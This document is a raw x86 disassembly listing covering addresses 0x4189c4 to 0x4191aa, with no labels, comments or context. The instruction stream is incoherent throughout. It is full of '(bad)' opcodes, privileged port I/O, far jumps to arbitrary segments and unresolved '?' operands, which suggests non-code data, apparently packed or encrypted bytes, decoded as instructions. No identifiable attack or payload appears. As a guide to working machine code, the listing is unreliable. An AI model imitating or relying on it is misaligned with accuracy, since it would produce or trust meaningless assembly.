  4189c4:	test   eax,0x6cc9dc48
  4189c9:	lahf   
  4189ca:	jae    0x418a21
  4189cc:	pop    ss
  4189cd:	fmul   st(3),st
  4189cf:	add    DWORD PTR [ecx],eax
  4189d1:	push   ebp
  4189d2:	int3   
  4189d3:	daa    
  4189d4:	retf   0xc3c5
  4189d7:	out    0xb3,eax
  4189d9:	push   edi
  4189da:	retf   0x703a
  4189dd:	push   edi
  4189de:	mov    ecx,0xfed2de12
  4189e3:	mov    esi,0x43fa27fb
  4189e8:	xor    ch,BYTE PTR [edi-0x7ecb4374]
  4189ee:	pop    ds
  4189ef:	and    al,0x4c
  4189f1:	pushf  
  4189f2:	cld    
  4189f3:	out    0x56,al
  4189f5:	icebp  
  4189f6:	jo     0x418a76
  4189f8:	es sbb eax,0xaa2b4268
  4189fe:	retf   0x539a
  418a01:	cdq    
  418a02:	adc    al,0xe6
  418a04:	cmp    BYTE PTR [edx-0x4a],dh
  418a07:	push   ds
  418a08:	pop    eax
  418a09:	jle    0x418a67
  418a0b:	shl    DWORD PTR [edi],cl
  418a0d:	xor    eax,0xdba69ae4
  418a12:	xor    eax,0x35a6a7dd
  418a17:	jmp    0x2e83:0xa258e909
  418a1e:	xor    eax,0xe110632b
  418a23:	jno    0x4189b4
  418a25:	jp     0x418aa1
  418a27:	or     al,0x51
  418a29:	jnp    0x4189c6
  418a2b:	xchg   edi,eax
  418a2c:	or     BYTE PTR [ebx-0x44],bh
  418a2f:	mov    ds,WORD PTR [eax+0x6e]
  418a32:	xor    esp,edi
  418a34:	inc    ecx
  418a35:	push   0x78
  418a37:	das    
  418a38:	pop    ebp
  418a39:	jle    0x418a1d
  418a3b:	popa   
  418a3c:	leave  
  418a3d:	imul   esp,DWORD PTR [edx+0xb],0x35
  418a41:	popa   
  418a42:	pop    ss
  418a43:	inc    edx
  418a44:	xchg   esp,eax
  418a45:	xchg   edx,eax
  418a46:	pop    esp
  418a47:	xor    cl,al
  418a49:	pop    es
  418a4a:	jb     0x418a28
  418a4c:	sub    al,0x31
  418a4e:	xor    BYTE PTR [esi],ch
  418a50:	ret    
  418a51:	mov    ?,WORD PTR [ebp+0x4c601be6]
  418a57:	pop    ss
  418a58:	pushf  
  418a59:	xor    ah,ah
  418a5b:	cmp    al,0xa7
  418a5d:	mov    dl,0x64
  418a5f:	fs ret 0x9845
  418a63:	fs mov ch,0xc4
  418a66:	adc    eax,0x73804c83
  418a6b:	(bad)  
  418a6c:	xlat   BYTE PTR ds:[ebx]
  418a6d:	inc    eax
  418a6e:	dec    esi
  418a6f:	jae    0x418a63
  418a71:	mov    dh,0x5e
  418a73:	mov    bl,0x13
  418a75:	jecxz  0x418a01
  418a77:	pop    ebp
  418a78:	ins    DWORD PTR es:[edi],dx
  418a79:	rol    BYTE PTR [ecx+edx*4],0x3b
  418a7d:	or     DWORD PTR [eax+eiz*1+0x79c82215],0x1e
  418a85:	add    eax,0x91b42137
  418a8a:	retf   
  418a8b:	(bad)  
  418a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a8e:	adc    esi,edi
  418a90:	cdq    
  418a91:	mov    esi,0x5213d834
  418a96:	sub    ch,BYTE PTR [ecx]
  418a98:	in     al,dx
  418a99:	loope  0x418a1f
  418a9b:	or     ebx,ebp
  418a9d:	aas    
  418a9e:	inc    edx
  418a9f:	test   eax,0x586deaee
  418aa4:	popf   
  418aa5:	(bad)  
  418aa6:	outs   dx,BYTE PTR ds:[esi]
  418aa7:	push   cs
  418aa8:	mov    ebp,0xd15539da
  418aad:	(bad)
  418ab0:	adc    ch,BYTE PTR [ecx+0x71cc032]
  418ab6:	lods   al,BYTE PTR ds:[esi]
  418ab7:	and    DWORD PTR [edx],edi
  418ab9:	dec    edi
  418aba:	cld    
  418abb:	or     edi,DWORD PTR ds:0xa9f7b9ae
  418ac1:	cld    
  418ac2:	push   esp
  418ac3:	in     al,dx
  418ac4:	aam    0x4e
  418ac6:	fisttp QWORD PTR ds:0x77459b12
  418acc:	xor    eax,0x407c84df
  418ad1:	cli    
  418ad2:	ror    DWORD PTR [ecx],cl
  418ad4:	out    0xff,eax
  418ad6:	mov    si,0x794f
  418ada:	sti    
  418adb:	ret    0xc3a2
  418ade:	adc    al,0xca
  418ae0:	jbe    0x418a87
  418ae2:	mov    WORD PTR [eax-0xa635560],cs
  418ae8:	(bad)  
  418ae9:	ins    BYTE PTR es:[edi],dx
  418aea:	or     ecx,DWORD PTR [ecx]
  418aec:	dec    edi
  418aed:	sar    BYTE PTR [edi+0x704da8d6],1
  418af3:	sbb    eax,0x2e9faa04
  418af8:	jb     0x418af7
  418afa:	repnz push esi
  418afc:	pop    ebx
  418afd:	mov    edx,0xf746e536
  418b02:	pop    ebx
  418b03:	push   es
  418b04:	inc    edi
  418b05:	push   edi
  418b06:	cmp    DWORD PTR [ecx-0x53be0fda],eax
  418b0c:	mov    gs,WORD PTR [edx-0x73870d69]
  418b12:	push   0xffffffc2
  418b14:	pop    edi
  418b15:	fisubr DWORD PTR cs:[esi-0x799eda65]
  418b1c:	adc    DWORD PTR [esi-0x524142fa],esi
  418b22:	dec    esi
  418b23:	stc    
  418b24:	jp     0x418b6d
  418b26:	xchg   BYTE PTR [edx+edx*4+0x7c036f08],al
  418b2d:	div    BYTE PTR [ebx-0x78]
  418b30:	pop    esp
  418b31:	int    0xd4
  418b33:	sbb    eax,0xc36d48e5
  418b38:	jle    0x418b7f
  418b3a:	lea    edi,[esi+esi*4-0x1456a441]
  418b41:	xor    eax,0x5d6404d6
  418b46:	aaa    
  418b47:	ret    0x39a9
  418b4a:	outs   dx,BYTE PTR ds:[esi]
  418b4b:	push   edi
  418b4c:	jno    0x418b4d
  418b4e:	dec    edx
  418b4f:	daa    
  418b50:	push   ebp
  418b51:	icebp  
  418b52:	sbb    eax,DWORD PTR [esp+edi*4]
  418b55:	xor    cl,BYTE PTR [ebx-0x4806ab5]
  418b5b:	jae    0x418b5a
  418b5d:	aam    0xcd
  418b5f:	pop    DWORD PTR [ebp+0x67f40861]
  418b65:	mov    cl,0x74
  418b67:	pop    esi
  418b68:	push   ebp
  418b69:	and    esp,DWORD PTR [edx+0x14]
  418b6c:	mov    edi,0xdbd9df8e
  418b71:	fyl2x  
  418b73:	jb     0x418b51
  418b75:	mov    ch,0xb9
  418b77:	aam    0x88
  418b79:	dec    edx
  418b7a:	ret    0x64fb
  418b7d:	or     BYTE PTR [esi-0x13],0x40
  418b81:	xchg   DWORD PTR [ebp-0x75e338b],ebx
  418b87:	mov    BYTE PTR [esi-0x11],al
  418b8a:	pop    ds
  418b8b:	and    bh,BYTE PTR [edx]
  418b8d:	xor    ebp,DWORD PTR gs:[bx+0x6f66]
  418b93:	sub    DWORD PTR [edi+0xeea65ac],edi
  418b99:	test   BYTE PTR [esi+0x6a9df7c8],ah
  418b9f:	retf   
  418ba0:	fdiv   DWORD PTR [eax+0x2523f4b0]
  418ba6:	popa   
  418ba7:	(bad)  
  418ba8:	sub    dl,BYTE PTR [eax-0x68fe69b9]
  418bae:	inc    ecx
  418baf:	retf   
  418bb0:	(bad)  
  418bb1:	dec    eax
  418bb2:	adc    al,0x9d
  418bb4:	add    ebx,ebp
  418bb6:	pop    esi
  418bb7:	mov    dh,0x87
  418bb9:	sahf   
  418bba:	sub    BYTE PTR ds:0x5ab3a5c9,dh
  418bc0:	sbb    eax,0xaf1bb4a9
  418bc5:	popf   
  418bc6:	jge    0x418c34
  418bc8:	(bad)  
  418bc9:	(bad)  
  418bca:	adc    eax,0xd5968e08
  418bcf:	cmp    BYTE PTR [edi-0x3369b525],0x51
  418bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bd7:	xor    dl,dl
  418bd9:	sbb    BYTE PTR [ebp-0x2aefdab2],0x0
  418be0:	in     al,0xbd
  418be2:	sbb    edi,DWORD PTR [edx+0x37051761]
  418be8:	adc    ah,dl
  418bea:	mov    ebp,0xbe4e5f61
  418bef:	jne    0x418b9e
  418bf1:	or     DWORD PTR [ecx+0x47],ebp
  418bf4:	or     eax,0xfa803386
  418bf9:	jp     0x418c19
  418bfb:	pop    esp
  418bfc:	xchg   edx,eax
  418bfd:	in     eax,dx
  418bfe:	push   edi
  418bff:	stos   BYTE PTR es:[edi],al
  418c00:	in     al,0x11
  418c02:	or     al,0x94
  418c04:	lods   al,BYTE PTR ds:[esi]
  418c05:	pop    es
  418c06:	sbb    eax,0x2d7523bb
  418c0b:	(bad)  
  418c0d:	adc    dh,bh
  418c0f:	mov    ds:0xf7e66510,eax
  418c14:	push   cs
  418c15:	adc    al,0x5c
  418c17:	add    DWORD PTR [esi-0x5f8dd35c],esp
  418c1d:	(bad)  
  418c1e:	stos   BYTE PTR es:[edi],al
  418c1f:	lea    ebx,[ebx]
  418c21:	dec    edi
  418c22:	adc    DWORD PTR [ecx-0x7],ebp
  418c25:	or     al,0x43
  418c27:	xor    eax,0xe636ae24
  418c2c:	adc    BYTE PTR [edi-0x6e451f30],ah
  418c32:	addr16 push edi
  418c34:	and    BYTE PTR [esi+eax*1],bh
  418c37:	and    BYTE PTR [ebx+esi*8+0x1098dbea],al
  418c3e:	mov    ebx,0xb3678c32
  418c43:	xchg   DWORD PTR [eax+0xc34441d],ebp
  418c49:	add    cl,ah
  418c4b:	sbb    dh,BYTE PTR [edx+0x1]
  418c4e:	adc    ch,BYTE PTR [ebp-0x1]
  418c51:	loop   0x418bdd
  418c53:	mov    ecx,esp
  418c55:	mov    fs,WORD PTR [esi-0x26]
  418c58:	and    al,0x76
  418c5a:	cdq    
  418c5b:	out    0xa5,eax
  418c5d:	lds    esi,FWORD PTR [esi+0x2]
  418c60:	dec    ebx
  418c61:	outs   dx,BYTE PTR ds:[esi]
  418c62:	loop   0x418bed
  418c64:	sbb    edx,DWORD PTR [edi]
  418c66:	sahf   
  418c67:	jo     0x418c86
  418c69:	data16 cmp ah,BYTE PTR [ecx+0x25a7ba0d]
  418c70:	cmp    DWORD PTR [eax-0x17],edi
  418c73:	push   ss
  418c74:	mov    ah,0x25
  418c76:	loope  0x418ce2
  418c78:	cmp    bl,0x99
  418c7b:	push   eax
  418c7c:	sahf   
  418c7d:	pop    esi
  418c7e:	int3   
  418c7f:	or     al,0xc
  418c81:	mov    al,0xac
  418c83:	pop    esi
  418c84:	aaa    
  418c85:	mov    ?,WORD PTR [edi-0x527cdf94]
  418c8b:	cmp    DWORD PTR cs:[ecx-0x2a4379d2],0xbb7c0f40
  418c96:	mov    ds:0x550749d,eax
  418c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c9c:	jmp    0x418c58
  418c9e:	push   0xffffffe8
  418ca0:	jmp    0x418d1e
  418ca2:	cwde   
  418ca3:	lods   eax,DWORD PTR ds:[esi]
  418ca4:	add    eax,0xa623a3f7
  418ca9:	fdivrp st(3),st
  418cab:	sbb    eax,0x72ac98ad
  418cb0:	sub    al,0xa7
  418cb2:	dec    edx
  418cb3:	les    esp,FWORD PTR [edx-0x6d]
  418cb6:	aad    0x43
  418cb8:	mov    ?,edx
  418cba:	aam    0xc5
  418cbc:	mov    ds:0x9313ead2,al
  418cc1:	sar    edx,1
  418cc3:	pop    ebp
  418cc4:	pusha  
  418cc5:	jno    0x418cd2
  418cc7:	jmp    0x934fb267
  418ccc:	scas   al,BYTE PTR es:[edi]
  418ccd:	pop    ecx
  418cce:	int3   
  418ccf:	outs   dx,BYTE PTR ds:[esi]
  418cd0:	xchg   esi,eax
  418cd1:	mov    ebp,0xee8594b5
  418cd6:	fwait
  418cd7:	inc    ebx
  418cd8:	and    eax,0x94bd5291
  418cdd:	adc    al,bl
  418cdf:	test   BYTE PTR [edx],bh
  418ce1:	and    ecx,ecx
  418ce3:	inc    ecx
  418ce4:	lds    esp,FWORD PTR [eax+0x55]
  418ce7:	rcr    BYTE PTR [esi+0x2c0a4e82],0x1f
  418cee:	lahf   
  418cef:	sub    cl,bl
  418cf1:	pop    esi
  418cf2:	push   esp
  418cf3:	fcom   DWORD PTR [eax-0x6022922]
  418cf9:	int    0x96
  418cfb:	and    BYTE PTR [eax+ecx*4],al
  418cfe:	retf   
  418cff:	mov    ebp,0x10e63111
  418d04:	sub    dl,ah
  418d06:	(bad)  
  418d08:	cmp    eax,0x49efbd7c
  418d0d:	scas   al,BYTE PTR es:[edi]
  418d0e:	sbb    al,0xba
  418d10:	push   esp
  418d11:	xor    BYTE PTR [eax+0xe],bh
  418d14:	mov    DWORD PTR [ebx+0x55bdd7c5],ebp
  418d1a:	stos   DWORD PTR es:[edi],eax
  418d1b:	clc    
  418d1c:	mov    ch,0xfc
  418d1e:	xchg   ebp,eax
  418d1f:	stos   DWORD PTR es:[edi],eax
  418d20:	ins    DWORD PTR es:[edi],dx
  418d21:	xchg   esp,eax
  418d22:	sub    ah,BYTE PTR [esi-0x31]
  418d25:	sti    
  418d26:	mov    al,ds:0xfcea4987
  418d2b:	mul    BYTE PTR ss:[eax]
  418d2e:	fnsave [edi-0x23]
  418d31:	xor    al,dh
  418d33:	cmp    al,BYTE PTR ds:[edx*1-0x7a02bddd]
  418d3b:	sar    DWORD PTR [eax],cl
  418d3d:	or     DWORD PTR [esi],0x66
  418d40:	cmp    ebp,0xffffffca
  418d43:	cmp    eax,0x7c25ad07
  418d48:	aad    0x65
  418d4a:	repnz push ebp
  418d4c:	ret    
  418d4d:	adc    BYTE PTR [esi],cl
  418d4f:	xor    al,dl
  418d51:	es push cs
  418d53:	xchg   edx,eax
  418d54:	test   DWORD PTR [ebp+0x5356ffe5],0x17ac43e1
  418d5e:	mov    al,ds:0xa41b00f0
  418d63:	leave  
  418d64:	pop    eax
  418d65:	imul   edx,DWORD PTR [edi-0x60],0xffffff8f
  418d69:	pop    esp
  418d6a:	push   esi
  418d6b:	lea    ebx,[edi]
  418d6d:	dec    esp
  418d6e:	out    dx,eax
  418d6f:	dec    eax
  418d70:	cmp    ebp,esp
  418d72:	push   esi
  418d73:	ja     0x418d97
  418d75:	mov    bp,WORD PTR [ebp+0x21116e4b]
  418d7c:	push   ds
  418d7d:	sbb    DWORD PTR [edi+0x62654623],edx
  418d83:	pop    edi
  418d84:	rol    BYTE PTR [ecx+0x14],0x8c
  418d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d89:	add    BYTE PTR [ecx+edx*1-0x6aeb7562],bl
  418d90:	enter  0x47b3,0xac
  418d94:	dec    ebx
  418d95:	pop    ss
  418d96:	dec    esi
  418d97:	psubd  mm4,QWORD PTR [eax]
  418d9a:	mov    ebx,ss
  418d9c:	mov    al,0x77
  418d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9f:	pop    es
  418da0:	xchg   ebx,eax
  418da1:	test   WORD PTR [edx],0xe594
  418da6:	mov    ebx,0x8b43ff41
  418dab:	sub    bh,BYTE PTR [edx-0x66c9a857]
  418db1:	mov    esp,edx
  418db3:	js     0x418d61
  418db5:	pop    ecx
  418db6:	aad    0x5f
  418db8:	mul    BYTE PTR [ecx]
  418dba:	push   esp
  418dbb:	clc    
  418dbc:	push   esp
  418dbd:	inc    eax
  418dbe:	(bad)  
  418dbf:	sub    edi,0x9171bc29
  418dc5:	adc    eax,0x90a52abb
  418dca:	sub    DWORD PTR [edi+0x15c724f8],0x8d191365
  418dd4:	gs jmp 0xaf2e:0xeba294d3
  418ddc:	call   0xd731f36f
  418de1:	ins    DWORD PTR es:[edi],dx
  418de2:	nop
  418de3:	jnp    0x418d8d
  418de5:	jno    0x418e20
  418de7:	add    esi,DWORD PTR [eax+0x5]
  418dea:	daa    
  418deb:	xchg   edx,eax
  418dec:	retf   
  418ded:	imul   DWORD PTR [ebx-0x5bcfd6fd]
  418df3:	ffreep st(0)
  418df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df6:	fucomip st,st(2)
  418df8:	xchg   ecx,eax
  418df9:	out    dx,al
  418dfa:	into   
  418dfb:	xor    edx,DWORD PTR [ecx-0x26515790]
  418e01:	sub    eax,0x1a1b7e66
  418e06:	xor    DWORD PTR [ebp+0x40],edx
  418e09:	mov    bl,0x5b
  418e0b:	mov    edx,0xe2bf5a13
  418e10:	and    al,0x6c
  418e12:	xchg   BYTE PTR [esi+0x20],bl
  418e15:	or     esi,DWORD PTR [eax+eax*2+0x2]
  418e19:	jne    0x418e8d
  418e1b:	adc    al,0x96
  418e1d:	and    eax,DWORD PTR [eax+edx*2]
  418e20:	gs dec edi
  418e22:	push   0x6f1808fe
  418e27:	icebp  
  418e28:	xor    al,0xd2
  418e2a:	sub    ch,BYTE PTR [esi+0x6a]
  418e2d:	push   eax
  418e2e:	ins    DWORD PTR es:[edi],dx
  418e2f:	and    esi,DWORD PTR [edi+ebx*4-0x391b8eef]
  418e36:	inc    ebx
  418e37:	jg     0x418e17
  418e39:	push   0x40996058
  418e3e:	imul   esp,DWORD PTR ds:0xbc79b6a0,0xffffff9c
  418e45:	shr    BYTE PTR [edx-0x21],0x68
  418e49:	mov    bl,0x56
  418e4b:	dec    edx
  418e4c:	push   ebp
  418e4d:	lds    esp,FWORD PTR [ebx]
  418e4f:	scas   al,BYTE PTR es:[edi]
  418e50:	fldenv [edx]
  418e52:	stos   DWORD PTR es:[edi],eax
  418e53:	ds sbb esi,eax
  418e56:	dec    ebp
  418e57:	pavgw  mm4,QWORD PTR [ebp+0x58c47f78]
  418e5e:	cwde   
  418e5f:	int3   
  418e60:	in     eax,dx
  418e61:	jg     0x418eda
  418e63:	push   ecx
  418e64:	or     al,0x67
  418e66:	gs inc esi
  418e68:	xor    DWORD PTR [eax],eax
  418e6a:	je     0x418e77
  418e6c:	loope  0x418e9b
  418e6e:	jmp    0x418e3a
  418e70:	repz gs dec esi
  418e73:	pop    esi
  418e74:	int    0xda
  418e76:	lahf   
  418e77:	sti    
  418e78:	jge    0x418e6b
  418e7a:	xchg   DWORD PTR [edi-0x187c20a7],edi
  418e80:	retf   0xffc1
  418e83:	js     0x418e61
  418e85:	push   edi
  418e86:	adc    al,0xc3
  418e88:	or     al,BYTE PTR [edx]
  418e8a:	fstp   st(2)
  418e8c:	in     eax,0xd9
  418e8e:	test   BYTE PTR [edx+ebp*2+0x12],bl
  418e92:	and    dh,bh
  418e94:	addr16 iret 
  418e96:	mov    ebp,0x83b35448
  418e9b:	mov    al,gs:0x5dd1bd91
  418ea1:	rcr    BYTE PTR [edx+0x177f0766],1
  418ea7:	and    ch,dl
  418ea9:	hlt    
  418eaa:	mov    ebp,0x38afb106
  418eaf:	mov    esi,0xdf90a5e9
  418eb4:	xor    al,0xdd
  418eb6:	xchg   DWORD PTR [eax+edi*8],edx
  418eb9:	sbb    ah,BYTE PTR [eax]
  418ebb:	fsubr  QWORD PTR [eax-0x3aee7fd4]
  418ec1:	in     eax,0xbc
  418ec3:	mov    ah,BYTE PTR [ebx]
  418ec5:	jne    0x418eea
  418ec7:	push   ds
  418ec8:	icebp  
  418ec9:	mov    ebx,0xda84a80d
  418ece:	retf   
  418ecf:	add    BYTE PTR [edx+ecx*8+0x262634e1],bh
  418ed6:	sub    al,0xe
  418ed8:	push   cs
  418ed9:	sti    
  418eda:	mov    ch,0xff
  418edc:	sub    BYTE PTR [ebp-0x58],0xee
  418ee0:	or     bl,cl
  418ee2:	arpl   dx,dx
  418ee4:	bound  ebp,QWORD PTR [edx]
  418ee6:	push   esi
  418ee7:	scas   eax,DWORD PTR es:[edi]
  418ee8:	mov    esi,0x68861dfb
  418eed:	inc    ebp
  418eee:	lds    ebx,FWORD PTR [edi]
  418ef0:	dec    esp
  418ef1:	dec    esi
  418ef2:	inc    DWORD PTR [ecx+0x7a]
  418ef5:	xchg   ecx,eax
  418ef6:	xor    al,0xa8
  418ef8:	pop    ebx
  418ef9:	push   esp
  418efa:	into   
  418efb:	pop    ds
  418efc:	into   
  418efd:	add    edi,DWORD PTR [ecx]
  418eff:	mov    WORD PTR [edi],ds
  418f01:	sbb    al,0xe5
  418f03:	sar    edi,cl
  418f05:	lock sbb al,0xab
  418f08:	mov    eax,0xdf73d844
  418f0d:	xchg   BYTE PTR [eax+edx*4],al
  418f10:	sub    BYTE PTR [ebp+0x4a7d446],bh
  418f16:	and    eax,0xead2bc52
  418f1b:	jno    0x418f70
  418f1d:	mov    bh,0xb3
  418f1f:	(bad)  
  418f20:	ret    
  418f21:	jp     0x418f23
  418f23:	mov    ch,0xe4
  418f25:	xchg   dh,dh
  418f27:	jg     0x418ead
  418f29:	mov    al,0x91
  418f2b:	mov    cl,0xfe
  418f2d:	jo     0x418f34
  418f2f:	add    DWORD PTR [esi-0x25cebba1],ebx
  418f35:	lods   al,BYTE PTR ds:[esi]
  418f36:	fldenv [eax*2+0x322d7f9]
  418f3d:	jp     0x418f4f
  418f3f:	icebp  
  418f40:	mov    ds:0xacc20437,eax
  418f45:	xor    eax,0x6efc0fde
  418f4a:	pop    edi
  418f4b:	mov    ah,0x5f
  418f4d:	es aas 
  418f4f:	mov    cl,0x9a
  418f51:	dec    ebx
  418f52:	aas    
  418f53:	call   0xb46d:0x304807d
  418f5a:	iret   
  418f5b:	add    DWORD PTR [eax],ebp
  418f5d:	cdq    
  418f5e:	pop    esp
  418f5f:	sbb    eax,0xb9dd776
  418f64:	push   esp
  418f65:	rol    DWORD PTR [ebp+0x1906b73],1
  418f6b:	sti    
  418f6c:	cmp    BYTE PTR [edx+0x37],dl
  418f6f:	stos   DWORD PTR es:[edi],eax
  418f70:	mov    WORD PTR [esi+0x7cb2fa3b],ss
  418f76:	or     al,0xdf
  418f78:	jle    0x418fcd
  418f7a:	mov    ebp,0x20f26a18
  418f7f:	in     eax,0xd8
  418f81:	loopne 0x418f83
  418f83:	aas    
  418f84:	sahf   
  418f85:	adc    DWORD PTR [edi-0x172b90cd],ebx
  418f8b:	mov    ds:0x75b8479e,al
  418f90:	lock sub BYTE PTR [eax-0x361c2f77],0x19
  418f98:	xchg   edi,eax
  418f99:	mov    eax,ds:0x1cccd420
  418f9e:	fcmovbe st,st(1)
  418fa0:	cmc    
  418fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fa2:	mov    ah,0x94
  418fa4:	pop    esi
  418fa5:	xor    al,0xa5
  418fa7:	repz jno 0x418f6a
  418faa:	and    al,0xfb
  418fac:	mov    cl,0xb5
  418fae:	rol    DWORD PTR [ebx+ecx*8],cl
  418fb1:	lock loop 0x419014
  418fb4:	ss jb  0x419033
  418fb7:	sbb    cl,0xb
  418fba:	in     al,0xa4
  418fbc:	mov    eax,ds:0xb50657e9
  418fc1:	jmp    0x6634503f
  418fc6:	ins    DWORD PTR es:[edi],dx
  418fc7:	sub    BYTE PTR [ecx+0x2],al
  418fca:	xor    al,0x68
  418fcc:	sbb    DWORD PTR [ebx+eax*1],esi
  418fcf:	les    edx,FWORD PTR [esi+0x1]
  418fd2:	clc    
  418fd3:	adc    esp,DWORD PTR [edx-0x68]
  418fd6:	sbb    dh,bl
  418fd8:	rcl    DWORD PTR [edi+0x3039f0f4],1
  418fde:	data16 je 0x418f7f
  418fe1:	sub    DWORD PTR [ebx-0x5],eax
  418fe4:	and    edi,ebx
  418fe6:	(bad)  
  418fe8:	mov    bh,0x2d
  418fea:	adc    edi,edi
  418fec:	sbb    eax,0xe9ee1120
  418ff1:	add    bl,BYTE PTR [edx+0xe81767a]
  418ff7:	adc    eax,0x51d5f978
  418ffc:	cwde   
  418ffd:	dec    eax
  418ffe:	and    dh,BYTE PTR [edx-0xf]
  419001:	mov    cl,0xc7
  419003:	in     eax,dx
  419004:	into   
  419005:	cli    
  419006:	pop    ebp
  419007:	jge    0x419022
  419009:	mul    BYTE PTR [ecx+0xe93eac]
  41900f:	push   edx
  419010:	iret   
  419011:	or     BYTE PTR [edi+0x3b],bh
  419014:	pop    eax
  419015:	or     eax,0x82f3be98
  41901a:	mov    cl,BYTE PTR es:[eax]
  41901d:	push   ecx
  41901e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41901f:	and    al,0x82
  419021:	ins    BYTE PTR es:[edi],dx
  419022:	push   esi
  419024:	inc    ebp
  419025:	ret    
  419026:	imul   esp,DWORD PTR ds:0xa547ea3e,0x16
  41902d:	test   al,0x96
  41902f:	push   eax
  419030:	popf   
  419031:	cwde   
  419032:	pop    eax
  419033:	dec    ebp
  419034:	mov    ecx,0xc5b9ff9f
  419039:	imul   edx,DWORD PTR [edx],0xffffffc1
  41903c:	mov    edx,0x43f68e57
  419041:	mov    gs,ecx
  419043:	jno    0x4190b3
  419045:	jmp    0x41908d
  419047:	push   DWORD PTR [edi-0x1e3e32e0]
  41904d:	inc    eax
  41904e:	mov    ecx,0x34b8c037
  419053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419054:	mov    eax,0x191467d0
  419059:	cdq    
  41905a:	dec    ecx
  41905b:	cli    
  41905c:	ret    0x10b4
  41905f:	call   0xe810:0xe3d898ba
  419066:	adc    BYTE PTR [ecx],0x46
  419069:	push   esp
  41906a:	sbb    eax,0xc8c26a0a
  41906f:	dec    ecx
  419070:	loope  0x4190c7
  419072:	xor    edi,esi
  419074:	fwait
  419075:	es out dx,al
  419077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419078:	adc    ebx,ebp
  41907a:	and    DWORD PTR [edi-0x4beb73f1],ebp
  419080:	sbb    eax,0x6f
  419083:	shr    DWORD PTR [esi],cl
  419085:	mov    eax,ds:0x440d9bc9
  41908a:	pop    eax
  41908b:	jb     0x419046
  41908d:	addr16 mov esi,0x71eddb0b
  419093:	mov    ah,0x3f
  419095:	int    0xe0
  419097:	lods   eax,DWORD PTR ds:[esi]
  419098:	mov    edi,0x67a690a3
  41909d:	inc    esi
  41909e:	or     eax,0x41b54465
  4190a3:	enter  0x27c,0x91
  4190a7:	sti    
  4190a8:	xchg   DWORD PTR [ecx+ecx*8-0x53],esp
  4190ac:	icebp  
  4190ad:	or     al,0x1b
  4190af:	ins    DWORD PTR es:[edi],dx
  4190b0:	loopne 0x4190d6
  4190b2:	xchg   esi,eax
  4190b3:	xchg   ebx,eax
  4190b4:	cmp    BYTE PTR [ebx+esi*2-0x4e07c7f7],al
  4190bb:	les    edx,FWORD PTR [ebp-0x3da550a7]
  4190c1:	adc    DWORD PTR [ecx-0x773fca53],ebp
  4190c7:	push   ebx
  4190c8:	jo     0x4190ba
  4190ca:	xor    ebp,DWORD PTR [ebp-0x4c214503]
  4190d0:	in     al,0x41
  4190d2:	je     0x41910b
  4190d4:	pop    edi
  4190d5:	cdq    
  4190d6:	or     eax,0xd320be04
  4190db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190dc:	(bad)  
  4190dd:	es mov ebx,0x8982c143
  4190e3:	lahf   
  4190e4:	test   BYTE PTR [ecx],cl
  4190e6:	pop    eax
  4190e7:	pop    esp
  4190e8:	and    DWORD PTR [esi],ebx
  4190ea:	xchg   esi,eax
  4190eb:	lods   eax,DWORD PTR ds:[esi]
  4190ec:	and    ch,0xf7
  4190ef:	nop
  4190f0:	push   ebp
  4190f1:	(bad)  
  4190f2:	(bad)  
  4190f3:	out    0xe7,eax
  4190f5:	fisttp WORD PTR [edi]
  4190f7:	stc    
  4190f8:	fst    QWORD PTR [ebx]
  4190fa:	mov    ah,BYTE PTR [ebx-0xf]
  4190fd:	mov    eax,ds:0x19496603
  419102:	mov    WORD PTR [ebp-0x32],?
  419105:	call   0x1796:0x371438a4
  41910c:	sti    
  41910d:	into   
  41910e:	mov    bl,0xfc
  419110:	jbe    0x41910b
  419112:	repnz inc edi
  419114:	std    
  419115:	mov    cl,0xeb
  419117:	pop    ds
  419118:	sbb    eax,0x1c2f2616
  41911d:	clc    
  41911e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41911f:	xor    ebx,edx
  419121:	stc    
  419122:	push   0xb47d55ce
  419127:	xor    BYTE PTR [ebx+ebx*1+0xd91dae2],dl
  41912e:	out    dx,eax
  41912f:	push   0xffffffdc
  419131:	imul   edi,DWORD PTR [ebp-0x58c3a1e6],0xffffffcd
  419138:	test   edx,0xd6921fa0
  41913e:	xlat   BYTE PTR ds:[ebx]
  41913f:	jecxz  0x41915c
  419141:	push   0xffffffee
  419143:	inc    ebx
  419144:	mov    ds:0xd993b0f1,eax
  419149:	mov    dh,0x7
  41914b:	ins    BYTE PTR es:[edi],dx
  41914c:	out    0xa7,eax
  41914e:	in     al,dx
  41914f:	pop    ds
  419150:	and    esp,ebp
  419152:	mov    BYTE PTR [esp+edi*1-0xe],ah
  419156:	gs mov ebp,0xbfc97197
  41915c:	in     al,dx
  41915d:	lock int3 
  41915f:	loopne 0x4191a8
  419161:	repz shl BYTE PTR [eax-0x4d66e80a],1
  419168:	cwde   
  419169:	test   BYTE PTR [ecx-0x76],ah
  41916c:	lea    edi,[edi-0x38c1db21]
  419172:	xlat   BYTE PTR ds:[ebx]
  419173:	dec    ebx
  419174:	pop    ds
  419175:	jb     0x419121
  419177:	pop    ebx
  419178:	jne    0x4191ee
  41917a:	imul   esi,DWORD PTR [ebx],0xffffffa8
  41917d:	pop    eax
  41917e:	outs   dx,DWORD PTR ds:[esi]
  41917f:	ds pushf 
  419181:	mov    al,0x85
  419183:	(bad)  
  419184:	dec    ebp
  419185:	adc    DWORD PTR [ebx+ecx*8+0x2c],ecx
  419189:	jmp    0x2fdf:0x773f995
  419190:	pop    esp
  419191:	ss mov al,0x42
  419194:	add    DWORD PTR [ebp-0x1cfa2f2],0x22afc9dd
  41919e:	push   0x56348ee5
  4191a3:	jl     0x419197
  4191a5:	mov    dh,0xfe
  4191a7:	xchg   edx,eax
  4191a8:	and    BYTE PTR [ecx],ah
  4191aa:	or     DWORD PTR [eax],edx
